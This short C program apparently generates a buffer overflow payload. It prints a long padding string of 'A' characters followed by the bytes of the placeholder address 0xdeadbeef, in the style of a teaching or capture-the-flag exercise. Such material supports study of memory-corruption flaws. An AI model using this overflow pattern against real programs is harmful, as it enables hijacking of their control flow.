#include <stdio.h>

int main(int ac, char** av) {
	int i = 0xdeadbeef;
	char *exploit = (char*) &i;
	printf("%s%s\r\n","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", exploit);

	return 0;
}